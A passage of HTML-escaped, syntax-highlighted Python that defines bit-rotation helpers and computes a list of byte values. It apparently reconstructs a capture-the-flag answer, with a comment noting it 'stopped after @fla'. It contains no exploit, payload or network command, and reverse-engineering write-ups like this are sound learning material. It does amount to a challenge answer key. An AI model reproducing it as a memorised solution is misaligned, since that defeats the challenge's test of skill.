&lt;span style=&#34;color: #93A1A1&#34;&gt;rol&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;lambda&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;val,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;r_bits,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;max_bits&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt; \
    &lt;span style=&#34;color: #93A1A1&#34;&gt;(val&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;r_bits&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;max_bits)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;max_bits&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;|&lt;/span&gt; \
    &lt;span style=&#34;color: #93A1A1&#34;&gt;((val&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;max_bits&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(max_bits&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(r_bits&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;max_bits)))&lt;/span&gt;
 
&lt;span style=&#34;color: #586E75&#34;&gt;# Rotate right: 0b1001 --&amp;gt; 0b1100&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;ror&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;lambda&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;val,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;r_bits,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;max_bits&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt; \
    &lt;span style=&#34;color: #93A1A1&#34;&gt;((val&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;max_bits&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;r_bits&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;max_bits)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;|&lt;/span&gt; \
    &lt;span style=&#34;color: #93A1A1&#34;&gt;(val&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(max_bits&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(r_bits&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;max_bits))&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;max_bits&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;))&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;arg2&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[]&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;x&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;range&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;):&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;arg2&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;insert(x,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;90&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;arg2[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;rol(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x1B&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xF2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;arg2[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x40&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xF2&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xB3&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x30&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; 

&lt;span style=&#34;color: #93A1A1&#34;&gt;arg2[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x1F&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x71&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;arg2[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;rol(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xB0&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xBC&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;  &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xA3&lt;/span&gt; 

&lt;span style=&#34;color: #93A1A1&#34;&gt;arg2[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xE8&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x79&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;arg2[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;rol(&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xf6&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x28&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x82&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;arg2[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;rol(&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x1f&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x2c&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x4d&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb0&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;arg2[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ror(&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;rol(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xAF&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x3F&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x2A&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb8&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x99&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x54&lt;/span&gt; 

&lt;span style=&#34;color: #93A1A1&#34;&gt;arg2[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;rol(&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x5D&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xBA&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;arg2[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;rol(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x29&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x30&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x6C&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xED&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;arg2[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb5&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbf&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;arg2[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;11&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ror(ror(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xa5&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x63&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x31&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x7b&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x8c&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbc&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;arg2[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ror&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ror&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ror&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xf3&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x98&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xAE&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x16&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x20&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;arg2[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;13&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;rol&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xa6&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xD2&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x6E&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;arg2[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;14&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x62&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x34&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;arg2[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;15&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x32&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xB2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x62&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x10&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xCD&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;arg2[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;16&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;rol&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xEB&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x07&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x73&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xB7&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;arg2[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;17&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;rol&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x0B&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x4C&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x5B&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x36&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x61&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x34&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;arg2[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x9A&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x5A&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;arg2[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;rol(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x99&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xa2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;arg2[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x2B&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xE7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x7E&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;arg2[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;21&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;rol(&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ror(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xAF&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x57&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x4A&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x4E&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x86&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb8&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;# stopped after @fla&lt;/span&gt;

&lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;item&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;enumerate&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(arg2):&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;arg2[index]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;item&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xFF&lt;/span&gt;

